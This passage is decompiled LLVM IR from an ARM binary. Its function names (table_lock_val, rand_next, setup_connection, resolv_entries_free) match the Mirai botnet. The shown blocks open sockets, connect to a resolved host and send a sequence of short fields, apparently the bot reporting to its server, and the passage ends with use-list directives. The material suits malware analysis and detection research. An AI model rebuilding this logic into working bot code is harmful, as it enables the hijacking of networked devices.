  %v4_1014c = call i32 @__libc_send(i32 %v3_10140, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  store i32 4, i32* @r3, align 4
  %v1_10154 = load i32, i32* @r6, align 4
  %v2_10154 = add i32 %v1_10154, 12
  %v3_10154 = inttoptr i32 %v2_10154 to i32*
  store i32 4, i32* %v3_10154, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_1015c:                               ; preds = %dec_label_pc_fdfc, %dec_label_pc_fe14, %dec_label_pc_fe0c, %bb448, %dec_label_pc_fde8, %dec_label_pc_fdcc, %dec_label_pc_fde0, %bb447
  %v0_10160 = phi i32 [ %v1_fdc0, %dec_label_pc_fde8 ], [ %v1_fdc0, %dec_label_pc_fdcc ], [ %v1_fdc0, %dec_label_pc_fde0 ], [ %v1_fdc0, %bb447 ], [ %v1_fe20, %bb448 ], [ %v1_fe20, %dec_label_pc_fe0c ], [ %v1_fe20, %dec_label_pc_fe14 ], [ %v1_fe20, %dec_label_pc_fdfc ]
  %v1_10160 = add i32 %v0_10160, 1
  store i32 %v1_10160, i32* @r7, align 4
  %v1_10164 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fe70

dec_label_pc_1016c:                               ; preds = %dec_label_pc_f7d8
  %v0_10174 = load i32, i32* @r6, align 4
  %v1_10174 = add i32 %v0_10174, 4
  %v2_10174 = inttoptr i32 %v1_10174 to i32*
  %v3_10174 = load i32, i32* %v2_10174, align 4
  %v1_10178 = call i32 @__GI___libc_close(i32 %v3_10174)
  %v0_1017c = load i32, i32* @r6, align 4
  %v1_1017c = add i32 %v0_1017c, 384
  %v2_1017c = inttoptr i32 %v1_1017c to i8*
  %v3_1017c = load i8, i8* %v2_1017c, align 1
  %v4_1017c = zext i8 %v3_1017c to i32
  %v1_10180 = add nuw nsw i32 %v4_1017c, 1
  %v1_10184 = urem i32 %v1_10180, 256
  store i32 %v1_10184, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1018c = icmp ugt i32 %v1_10184, 9
  store i1 %v2_1018c, i1* %cpsr_c.global-to-local, align 1
  %v7_1018c = icmp eq i32 %v1_10184, 10
  store i1 %v7_1018c, i1* %cpsr_z.global-to-local, align 1
  %v2_10190 = add i32 %v0_1017c, 4
  %v3_10190 = inttoptr i32 %v2_10190 to i32*
  store i32 -1, i32* %v3_10190, align 4
  %v0_10194 = load i32, i32* @r3, align 4
  %v1_10194 = trunc i32 %v0_10194 to i8
  %v2_10194 = load i32, i32* @r6, align 4
  %v3_10194 = add i32 %v2_10194, 384
  %v4_10194 = inttoptr i32 %v3_10194 to i8*
  store i8 %v1_10194, i8* %v4_10194, align 1
  %v0_10198 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10198, label %dec_label_pc_1019c, label %dec_label_pc_101f8

dec_label_pc_1019c:                               ; preds = %dec_label_pc_1016c
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r7, align 4
  %v1_101a4 = load i32, i32* @r6, align 4
  %v2_101a4 = add i32 %v1_101a4, 12
  %v3_101a4 = inttoptr i32 %v2_101a4 to i32*
  store i32 0, i32* %v3_101a4, align 4
  %v0_101a8 = load i32, i32* @r3, align 4
  %v1_101a8 = trunc i32 %v0_101a8 to i8
  %v2_101a8 = load i32, i32* @r6, align 4
  %v3_101a8 = add i32 %v2_101a8, 384
  %v4_101a8 = inttoptr i32 %v3_101a8 to i8*
  store i8 %v1_101a8, i8* %v4_101a8, align 1
  br label %dec_label_pc_f904

dec_label_pc_101b0:                               ; preds = %dec_label_pc_100e0
  store i32 %v2_100a0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_101bc = add i32 %v0_100cc, 4
  %v2_101bc = inttoptr i32 %v1_101bc to i32*
  %v3_101bc = load i32, i32* %v2_101bc, align 4
  %v4_101c0 = call i32 @__libc_send(i32 %v3_101bc, i32 %v2_100a0, i32 3, i32 16384)
  br label %dec_label_pc_faa4

dec_label_pc_101d4:                               ; preds = %dec_label_pc_f6bc
  store i32 %.pre, i32* @r0, align 4
  %v1_101dc = add i32 %v0_101d4, 92
  store i32 %v1_101dc, i32* @r1, align 4
  store i32 292, i32* @r2, align 4
  %v3_101e4 = call i32 @memmove(i32 %.pre, i32 %v1_101dc, i32 292)
  %v0_101e8 = load i32, i32* @r6, align 4
  %v1_101e8 = add i32 %v0_101e8, 24
  %v2_101e8 = inttoptr i32 %v1_101e8 to i32*
  %v3_101e8 = load i32, i32* %v2_101e8, align 4
  %v1_101ec = add i32 %v3_101e8, -64
  store i32 %v1_101ec, i32* %r3.global-to-local, align 4
  store i32 %v1_101ec, i32* %v2_101e8, align 4
  br label %dec_label_pc_f6cc

dec_label_pc_101f8:                               ; preds = %dec_label_pc_1016c
  %v0_101f8 = load i32, i32* @r6, align 4
  store i32 %v0_101f8, i32* @r0, align 4
  %v0_101fc = call i32 @setup_connection()
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f904

dec_label_pc_10208:                               ; preds = %dec_label_pc_f674
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_edf0, i32* %r3.global-to-local, align 4
  store i32 %v2_1000c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_10230 = call i32 @getsockopt(i32 %v3_f668, i32 1, i32 4, i32 %v2_edf0, i32 %v2_1000c)
  %v3_10234 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10234, i32* %r3.global-to-local, align 4
  %v2_10238 = or i32 %v3_10234, %v5_10230
  %v4_10238 = icmp eq i32 %v2_10238, 0
  store i1 %v4_10238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10238, label %dec_label_pc_10240, label %dec_label_pc_102cc

dec_label_pc_10240:                               ; preds = %dec_label_pc_10208
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_10244 = load i32, i32* @r6, align 4
  %v2_10244 = add i32 %v1_10244, 12
  %v3_10244 = inttoptr i32 %v2_10244 to i32*
  store i32 2, i32* %v3_10244, align 4
  %v0_10248 = call i32 @rand_next()
  %v2_10250 = load i16, i16* bitcast (i16** @global_var_22444.151 to i16*), align 4
  %v3_10250 = zext i16 %v2_10250 to i32
  %v3_10254 = urem i32 %v0_10248, %v3_10250
  store i32 ptrtoint (i32* @global_var_22414.147 to i32), i32* %r3.global-to-local, align 4
  %v2_1025c = load i32, i32* @global_var_22414.147, align 4
  store i32 %v2_1025c, i32* %ip.global-to-local, align 4
  %v1_10264 = load i32, i32* @r4, align 4
  %v9_10264 = icmp eq i32 %v2_1025c, %v1_10264
  store i1 %v9_10264, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10254, i32* %r1.global-to-local, align 4
  %v7_1026c = icmp sgt i32 %v2_1025c, %v1_10264
  br i1 %v7_1026c, label %dec_label_pc_10270, label %dec_label_pc_102a8

dec_label_pc_10270:                               ; preds = %dec_label_pc_10240
  %v2_10274 = load i32, i32* @global_var_22440.149, align 4
  store i32 %v2_10274, i32* %r3.global-to-local, align 4
  store i32 %v1_10264, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10298, %dec_label_pc_10270
  %v0_10298 = phi i32 [ %v1_10298, %dec_label_pc_10298 ], [ %v1_10264, %dec_label_pc_10270 ]
  %v0_102a0 = phi i32 [ %v1_102a0, %dec_label_pc_10298 ], [ %v2_10274, %dec_label_pc_10270 ]
  %v1_10280 = add i32 %v0_102a0, 8
  %v2_10280 = inttoptr i32 %v1_10280 to i16*
  %v3_10280 = load i16, i16* %v2_10280, align 2
  %v4_10280 = zext i16 %v3_10280 to i32
  store i32 %v4_10280, i32* %r3.global-to-local, align 4
  %tmp457 = icmp ugt i32 %v4_10280, %v3_10254
  br i1 %tmp457, label %dec_label_pc_10298, label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_1027c
  %v1_1028c = add i32 %v0_102a0, 10
  %v2_1028c = inttoptr i32 %v1_1028c to i16*
  %v3_1028c = load i16, i16* %v2_1028c, align 2
  %v4_1028c = zext i16 %v3_1028c to i32
  store i32 %v4_1028c, i32* %r3.global-to-local, align 4
  %v3_10290 = icmp uge i32 %v4_1028c, %v3_10254
  %v9_10290 = icmp eq i32 %v4_1028c, %v3_10254
  %v2_10294 = xor i1 %v9_10290, true
  %v3_10294 = and i1 %v3_10290, %v2_10294
  br i1 %v3_10294, label %dec_label_pc_102ac.loopexit, label %dec_label_pc_10298

dec_label_pc_10298:                               ; preds = %dec_label_pc_1028c, %dec_label_pc_1027c
  %v1_10298 = add i32 %v0_10298, 1
  store i32 %v1_10298, i32* %r2.global-to-local, align 4
  %v9_1029c = icmp eq i32 %v1_10298, %v2_1025c
  %v1_102a0 = add i32 %v0_102a0, 16
  store i32 %v1_102a0, i32* %r3.global-to-local, align 4
  br i1 %v9_1029c, label %dec_label_pc_102a8.loopexit, label %dec_label_pc_1027c

dec_label_pc_102a8.loopexit:                      ; preds = %dec_label_pc_10298
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_102a8.loopexit, %dec_label_pc_10240
  br label %dec_label_pc_102ac

dec_label_pc_102ac.loopexit:                      ; preds = %dec_label_pc_1028c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_10290, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_102ac

dec_label_pc_102ac:                               ; preds = %dec_label_pc_102ac.loopexit, %dec_label_pc_102a8
  %v0_102c0 = phi i32 [ %v0_102a0, %dec_label_pc_102ac.loopexit ], [ 0, %dec_label_pc_102a8 ]
  %v0_102ac = load i32, i32* @r6, align 4
  %v1_102ac = add i32 %v0_102ac, 4
  %v2_102ac = inttoptr i32 %v1_102ac to i32*
  %v3_102ac = load i32, i32* %v2_102ac, align 4
  %v3_102b0 = udiv i32 %v3_102ac, 32
  store i32 %v3_102b0, i32* %r2.global-to-local, align 4
  %v1_102b4 = urem i32 %v3_102ac, 32
  store i32 %v1_102b4, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_102b8 = mul nuw nsw i32 %v3_102b0, 4
  store i32 %v3_102b8, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_102c0 = inttoptr i32 %v0_102ac to i32*
  store i32 %v0_102c0, i32* %v2_102c0, align 4
  %v0_102c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_102c4 = load i32, i32* @r6, align 4
  %v2_102c4 = add i32 %v1_102c4, 24
  %v3_102c4 = inttoptr i32 %v2_102c4 to i32*
  store i32 %v0_102c4, i32* %v3_102c4, align 4
  %v0_f69c.pre = load i32, i32* @ip, align 4
  %v1_f6a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f698

dec_label_pc_102cc:                               ; preds = %dec_label_pc_10208
  %v0_102cc = load i32, i32* @r6, align 4
  %v1_102cc = add i32 %v0_102cc, 4
  %v2_102cc = inttoptr i32 %v1_102cc to i32*
  %v3_102cc = load i32, i32* %v2_102cc, align 4
  %v1_102d0 = call i32 @__GI___libc_close(i32 %v3_102cc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_102d8 = load i32, i32* @r4, align 4
  %v1_102d8 = load i32, i32* @r6, align 4
  %v2_102d8 = add i32 %v1_102d8, 12
  %v3_102d8 = inttoptr i32 %v2_102d8 to i32*
  store i32 %v0_102d8, i32* %v3_102d8, align 4
  %v0_102dc = load i32, i32* %r3.global-to-local, align 4
  %v1_102dc = load i32, i32* @r6, align 4
  %v2_102dc = add i32 %v1_102dc, 4
  %v3_102dc = inttoptr i32 %v2_102dc to i32*
  store i32 %v0_102dc, i32* %v3_102dc, align 4
  %v0_102e0 = load i32, i32* @r4, align 4
  %v1_102e0 = trunc i32 %v0_102e0 to i8
  %v2_102e0 = load i32, i32* @r6, align 4
  %v3_102e0 = add i32 %v2_102e0, 384
  %v4_102e0 = inttoptr i32 %v3_102e0 to i8*
  store i8 %v1_102e0, i8* %v4_102e0, align 1
  br label %dec_label_pc_f7c0

dec_label_pc_102e8:                               ; preds = %dec_label_pc_f8bc
  store i32 %v2_f86c, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_102f4 = add i32 %v1_f8d8, 4
  %v2_102f4 = inttoptr i32 %v1_102f4 to i32*
  %v3_102f4 = load i32, i32* %v2_102f4, align 4
  store i32 %v3_102f4, i32* @r4, align 4
  %v0_102f8 = call i32 @rand_next()
  %v0_102fc = load i32, i32* @r5, align 4
  %v1_102fc = inttoptr i32 %v0_102fc to i8*
  %v2_102fc = load i8, i8* %v1_102fc, align 1
  %v3_102fc = zext i8 %v2_102fc to i32
  %v3_10300 = urem i32 %v0_102f8, %v3_102fc
  store i32 %v3_10300, i32* %r1.global-to-local, align 4
  %v0_10304 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10304 = mul nuw nsw i32 %v3_10300, 4
  %v5_10304 = add i32 %v0_10304, %v4_10304
  %v6_10304 = inttoptr i32 %v5_10304 to i32*
  %v7_10304 = load i32, i32* %v6_10304, align 4
  store i32 %v7_10304, i32* %r3.global-to-local, align 4
  %v0_1030c = load i32, i32* @sl, align 4
  store i32 %v0_1030c, i32* %r1.global-to-local, align 4
  %v2_10314 = inttoptr i32 %v0_1030c to i32*
  %v3_10314 = call i32 @table_retrieve_val(i32 4, i32* %v2_10314)
  store i32 %v2_f86c, i32* %ip.global-to-local, align 4
  %v0_10324 = load i32, i32* @r5, align 4
  %v1_10328 = call i32 @resolv_entries_free(i32 %v0_10324)
  %v1_10330 = call i32 @table_lock_val(i32 3)
  %v1_10338 = call i32 @table_lock_val(i32 4)
  %v0_10340 = load i32, i32* @r8, align 4
  store i32 %v2_10344, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1034c = call i32 @__libc_connect(i32 %v0_10340, i32 %v2_10344, i32 16)
  %v3_10350 = icmp eq i32 %v3_1034c, -1
  store i1 %v3_10350, i1* %cpsr_c.global-to-local, align 1
  %v8_10350 = icmp eq i32 %v3_1034c, -1
  store i1 %v8_10350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10350, label %dec_label_pc_10358, label %dec_label_pc_10368

dec_label_pc_10358:                               ; preds = %dec_label_pc_102e8
  %v0_10358 = load i32, i32* @r8, align 4
  %v1_1035c = call i32 @__GI___libc_close(i32 %v0_10358)
  %v0_10360 = load i32, i32* @sl, align 4
  %v1_10364 = call i32 @__GI_exit(i32 %v0_10360)
  br label %dec_label_pc_10368

dec_label_pc_10368:                               ; preds = %dec_label_pc_102e8, %dec_label_pc_10358
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_edf0, i32* %r1.global-to-local, align 4
  %v0_10374 = load i32, i32* @r8, align 4
  %v0_10378 = load i32, i32* @sl, align 4
  store i32 %v0_10378, i32* %stack_var_-56, align 4
  %v5_1037c = call i32 @__libc_send(i32 %v0_10374, i32 %v2_edf0, i32 1, i32 16384)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10390 = load i32, i32* @r8, align 4
  %v4_10394 = call i32 @__libc_send(i32 %v0_10390, i32 %v2_1000c, i32 4, i32 16384)
  store i32 %v2_1039c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103a8 = load i32, i32* @r8, align 4
  %v4_103ac = call i32 @__libc_send(i32 %v0_103a8, i32 %v2_1039c, i32 2, i32 16384)
  %v0_103b0 = load i32, i32* @sb, align 4
  %v1_103b0 = add i32 %v0_103b0, 12
  store i32 %v1_103b0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103bc = load i32, i32* @r8, align 4
  %v4_103c0 = call i32 @__libc_send(i32 %v0_103bc, i32 %v1_103b0, i32 1, i32 16384)
  %v0_103c4 = load i32, i32* @sb, align 4
  %v1_103c4 = inttoptr i32 %v0_103c4 to i32*
  %v2_103c4 = load i32, i32* %v1_103c4, align 4
  store i32 %v2_103c4, i32* %r1.global-to-local, align 4
  %v1_103c8 = add i32 %v0_103c4, 12
  %v2_103c8 = inttoptr i32 %v1_103c8 to i8*
  %v3_103c8 = load i8, i8* %v2_103c8, align 1
  %v4_103c8 = zext i8 %v3_103c8 to i32
  store i32 %v4_103c8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103d0 = load i32, i32* @r8, align 4
  %v4_103d4 = call i32 @__libc_send(i32 %v0_103d0, i32 %v2_103c4, i32 %v4_103c8, i32 16384)
  %v0_103d8 = load i32, i32* @sb, align 4
  %v1_103d8 = add i32 %v0_103d8, 13
  store i32 %v1_103d8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103e4 = load i32, i32* @r8, align 4
  %v4_103e8 = call i32 @__libc_send(i32 %v0_103e4, i32 %v1_103d8, i32 1, i32 16384)
  %v0_103ec = load i32, i32* @r8, align 4
  %v0_103f0 = load i32, i32* @sb, align 4
  %v1_103f0 = add i32 %v0_103f0, 13
  %v2_103f0 = inttoptr i32 %v1_103f0 to i8*
  %v3_103f0 = load i8, i8* %v2_103f0, align 1
  %v4_103f0 = zext i8 %v3_103f0 to i32
  store i32 %v4_103f0, i32* %r2.global-to-local, align 4
  %v1_103f4 = add i32 %v0_103f0, 4
  %v2_103f4 = inttoptr i32 %v1_103f4 to i32*
  %v3_103f4 = load i32, i32* %v2_103f4, align 4
  store i32 %v3_103f4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_103fc = call i32 @__libc_send(i32 %v0_103ec, i32 %v3_103f4, i32 %v4_103f0, i32 16384)
  %v0_10400 = load i32, i32* @r8, align 4
  %v1_10404 = call i32 @__GI___libc_close(i32 %v0_10400)
  br label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_f8a0, %dec_label_pc_10368
  %v0_10408 = load i32, i32* @sl, align 4
  %v1_1040c = call i32 @__GI_exit(i32 %v0_10408)
  br label %dec_label_pc_10410

dec_label_pc_10410.loopexit:                      ; preds = %dec_label_pc_fe28
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10410

dec_label_pc_10410:                               ; preds = %dec_label_pc_10410.loopexit, %dec_label_pc_10408
  %v1_10414 = call i32 @table_lock_val(i32 30)
  %v0_10418 = load i32, i32* @r6, align 4
  %v1_10418 = add i32 %v0_10418, 12
  %v2_10418 = inttoptr i32 %v1_10418 to i32*
  %v3_10418 = load i32, i32* %v2_10418, align 4
  br label %dec_label_pc_f6b4.backedge

dec_label_pc_f6b4.backedge.thread:                ; preds = %dec_label_pc_f92c, %dec_label_pc_fad0, %dec_label_pc_fba4, %dec_label_pc_fc78, %dec_label_pc_fea8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6bc

dec_label_pc_f6b4.backedge.thread562:             ; preds = %dec_label_pc_fc08, %dec_label_pc_fb34, %dec_label_pc_ff0c, %dec_label_pc_fd4c, %dec_label_pc_f990
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6bc

dec_label_pc_f6b4.backedge:                       ; preds = %dec_label_pc_f734, %dec_label_pc_10410, %dec_label_pc_10420
  %v0_f6bc228 = phi i32 [ %v0_10430, %dec_label_pc_10420 ], [ %v0_10418, %dec_label_pc_10410 ], [ %v0_f734, %dec_label_pc_f734 ]
  %v0_f6b4.be = phi i32 [ %v3_10430, %dec_label_pc_10420 ], [ %v3_10418, %dec_label_pc_10410 ], [ %v3_f734, %dec_label_pc_f734 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6b4 = icmp eq i32 %v0_f6b4.be, 0
  store i1 %v2_f6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6b4, label %dec_label_pc_f7c0, label %dec_label_pc_f6bc

dec_label_pc_10420:                               ; preds = %dec_label_pc_10058
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_10424 = call i32 @table_lock_val(i32 31)
  %v1_1042c = call i32 @table_lock_val(i32 32)
  %v0_10430 = load i32, i32* @r6, align 4
  %v1_10430 = add i32 %v0_10430, 12
  %v2_10430 = inttoptr i32 %v1_10430 to i32*
  %v3_10430 = load i32, i32* %v2_10430, align 4
  br label %dec_label_pc_f6b4.backedge

dec_label_pc_10438:                               ; preds = %dec_label_pc_f76c
  store i32 %v0_f2d0, i32* %r2.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f2ec, align 4
  br label %dec_label_pc_f788

dec_label_pc_10448:                               ; preds = %dec_label_pc_edd0
  store i32 ptrtoint (i32* @global_var_24f30.158 to i32), i32* %r2.global-to-local, align 4
  %v2_1044c = load i32, i32* @global_var_24f30.158, align 4
  %v1_10450 = call i32 @__GI___libc_close(i32 %v2_1044c)
  br label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_edac, %dec_label_pc_10448
  %v0_10454 = load i32, i32* @r5, align 4
  %v1_10458 = call i32 @__GI_exit(i32 %v0_10454)
  ret i32 %v1_10458

; uselistorder directives
  uselistorder i32 %v0_10430, { 1, 0 }
  uselistorder i32 %v3_102ac, { 1, 0 }
  uselistorder i32 %v1_102a0, { 1, 0 }
  uselistorder i32 %v1_10298, { 1, 2, 0 }
  uselistorder i1 %v9_10290, { 1, 0 }
  uselistorder i32 %v3_10254, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10184, { 2, 1, 0 }
  uselistorder i32 %v0_10100.pr, { 1, 0 }
  uselistorder i32 %v0_100cc, { 1, 2, 0 }
  uselistorder i32 %v4_1006c, { 1, 0 }
  uselistorder i1 %v7_10048, { 1, 0 }
  uselistorder i32 %v1_fff0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fff0, { 0, 2, 1 }
  uselistorder i32 %v0_ffe8, { 1, 0 }
  uselistorder i1 %v7_ffe4, { 1, 0 }
  uselistorder i1 %v7_ffdc, { 1, 0 }
  uselistorder i1 %v7_ffd4, { 1, 0 }
  uselistorder i1 %v8_ffcc, { 1, 0 }
  uselistorder i1 %v7_ffb0, { 1, 0 }
  uselistorder i1 %v7_ffa8, { 1, 0 }
  uselistorder i1 %v7_ffa0, { 1, 0 }
  uselistorder i1 %v8_ff98, { 1, 0 }
  uselistorder i32 %v1_ff80, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_ff1c, { 1, 0 }
  uselistorder i8 %v3_ff14, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ff0c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ff0c, { 0, 2, 1 }
  uselistorder i32 %v0_ff04, { 1, 0 }
  uselistorder i1 %v7_ff00, { 1, 0 }
  uselistorder i1 %v7_fef8, { 1, 0 }
  uselistorder i1 %v7_fef0, { 1, 0 }
  uselistorder i1 %v7_fedc, { 1, 0 }
  uselistorder i1 %v7_fed4, { 1, 0 }
  uselistorder i1 %v7_fecc, { 1, 0 }
  uselistorder i1 %v8_fec4, { 1, 0 }
  uselistorder i32 %v1_feac, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fe54, { 1, 0 }
  uselistorder i32 %v1_fe20, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fe20, { 0, 2, 1 }
  uselistorder i32 %v0_fe18, { 1, 0 }
  uselistorder i1 %v7_fe14, { 1, 0 }
  uselistorder i1 %v7_fe0c, { 1, 0 }
  uselistorder i1 %v8_fe04, { 1, 0 }
  uselistorder i1 %v7_fde8, { 1, 0 }
  uselistorder i1 %v7_fde0, { 1, 0 }
  uselistorder i1 %v8_fdd8, { 1, 0 }
  uselistorder i32 %v1_fdc0, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fd5c, { 1, 0 }
  uselistorder i8 %v3_fd54, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fd4c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fd4c, { 0, 2, 1 }
  uselistorder i32 %v0_fd44, { 1, 0 }
  uselistorder i1 %v7_fd40, { 1, 0 }
  uselistorder i1 %v7_fd38, { 1, 0 }
  uselistorder i1 %v7_fd30, { 1, 0 }
  uselistorder i1 %v7_fcac, { 1, 0 }
  uselistorder i1 %v7_fca4, { 1, 0 }
  uselistorder i1 %v7_fc9c, { 1, 0 }
  uselistorder i1 %v8_fc94, { 1, 0 }
  uselistorder i32 %v1_fc7c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fc18, { 1, 0 }
  uselistorder i8 %v3_fc10, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc08, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fc08, { 0, 2, 1 }
  uselistorder i32 %v0_fc00, { 1, 0 }
  uselistorder i1 %v7_fbfc, { 1, 0 }
  uselistorder i1 %v7_fbf4, { 1, 0 }
  uselistorder i1 %v7_fbec, { 1, 0 }
  uselistorder i1 %v7_fbd8, { 1, 0 }
  uselistorder i1 %v7_fbd0, { 1, 0 }
  uselistorder i1 %v7_fbc8, { 1, 0 }
  uselistorder i1 %v8_fbc0, { 1, 0 }
  uselistorder i32 %v1_fba8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fb44, { 1, 0 }
  uselistorder i8 %v3_fb3c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fb34, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fb34, { 0, 2, 1 }
  uselistorder i32 %v0_fb2c, { 1, 0 }
  uselistorder i1 %v7_fb28, { 1, 0 }
  uselistorder i1 %v7_fb20, { 1, 0 }
  uselistorder i1 %v7_fb18, { 1, 0 }
  uselistorder i1 %v7_fb04, { 1, 0 }
  uselistorder i1 %v7_fafc, { 1, 0 }
  uselistorder i1 %v7_faf4, { 1, 0 }
  uselistorder i1 %v8_faec, { 1, 0 }
  uselistorder i32 %v1_fad4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_fac0, { 1, 0 }
  uselistorder i32 %v1_fab8, { 1, 0 }
  uselistorder i32 %v1_fab0, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_faac, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_faac, { 0, 2, 1 }
  uselistorder i32 %v0_fa8c.pr, { 1, 0 }
  uselistorder i32 %v0_fa6c.pr, { 1, 0 }
  uselistorder i1 %v7_fa44, { 1, 0 }
  uselistorder i1 %v2_fa34, { 1, 0, 2 }
  uselistorder i1 %v2_fa18, { 1, 0, 2 }
  uselistorder i32 %v1_fa38, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fa0c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_fa3c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f9a0, { 1, 0 }
  uselistorder i8 %v3_f998, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f990, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f990, { 0, 2, 1 }
  uselistorder i32 %v0_f988, { 1, 0 }
  uselistorder i1 %v7_f984, { 1, 0 }
  uselistorder i1 %v7_f97c, { 1, 0 }
  uselistorder i1 %v7_f974, { 1, 0 }
  uselistorder i1 %v7_f960, { 1, 0 }
  uselistorder i1 %v7_f958, { 1, 0 }
  uselistorder i1 %v7_f950, { 1, 0 }
  uselistorder i1 %v8_f948, { 1, 0 }
  uselistorder i32 %v1_f930, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f91c, { 1, 2, 0 }
  uselistorder i32 %v2_f908, { 1, 0 }
  uselistorder i32 %v0_f908, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f904, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f8b0, { 1, 0 }
  uselistorder i32 %v3_f8ac, { 1, 0, 2 }
  uselistorder i1 %v2_f898, { 1, 0 }
  uselistorder i32 %.462, { 1, 0 }
  uselistorder i1 %v7_f880, { 1, 0 }
  uselistorder i32 %v0_f87c, { 2, 1, 0 }
  uselistorder i1 %v7_f854, { 1, 0 }
  uselistorder i32 %v0_f854, { 2, 1, 0, 3 }
